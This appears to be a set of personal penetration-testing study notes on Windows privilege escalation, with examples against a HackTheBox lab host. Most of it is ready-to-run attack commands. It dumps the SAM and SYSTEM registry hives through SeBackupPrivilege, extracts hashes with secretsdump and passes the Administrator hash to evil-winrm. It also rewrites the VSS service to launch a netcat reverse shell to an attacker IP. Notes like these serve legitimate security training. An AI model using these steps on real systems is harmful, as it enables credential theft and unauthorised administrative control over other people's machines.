## Start here
Check user priveleges
```
whoami /priv
```
Interesting entries include:
- SeBackupPrivilege (get arbitrary file read; described below)
- SeLoadDriverPrivilege (load a vulnerable driver and exploit it)
- SeMachineAccountPrivilege (add a machine to the domain)

Check user groups
```
whoami /groups
```
Interesting entries include:
- Server Operators (start and stop services; described below)

  
## SeBackupPrivilege
SeBackupPrivilege exploitation
```
whoami /priv
Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
```
Obtain SAM and SYSTEM registry hives
```
# Using evil-winrm session to the victim host
cd C:\temp
reg save hklm\sam sam
reg save hklm\system system
download sam
download system
```
Extract hashes
```
# On Kali host
secretsdump.py -sam sam -system system LOCAL
OR
impacket-secretsdump -sam sam -system system local

[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
```
Use the hashes (2nd part is the NT hash) with evil-winrm for execution
```
# evil-winrm -u Administrator -H <NT hash> -i cicada.htb
evil-winrm -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -i cicada.htb
```

## Server Operators
Create malicious service that creates privileged reverse shell nc.exe
```
# Using evil-winrm session, place the nc.exe in the same folder on Kali linux
# nc.exe will be uploaded to the current folder on the Windows host
upload nc.exe

# check running services
sc.exe query

# modify the config of 'vss' service (as this is a popular service) to point to nc.exe
sc.exe config vss binPath="C:\path\to\nc.exe -e cmd.exe <Kali IP> 4444"

# On Kali prepare for the connection
nc -nlvp 4444

# Restart the service
sc.exe stop VSS
sc.exe start VSS
```
The above-obtained shell is unstable and might die after a few seconds. A more efficient way would be to obtain a meterpreter shell and then quickly migrate to a more stable process.

Refer to: https://github.com/nestef23/my-OSCP-notes/blob/e963b72f058faffbab4a14b35eb2f6878be04900/InitialAccess/revshells.md#with-msfvenom


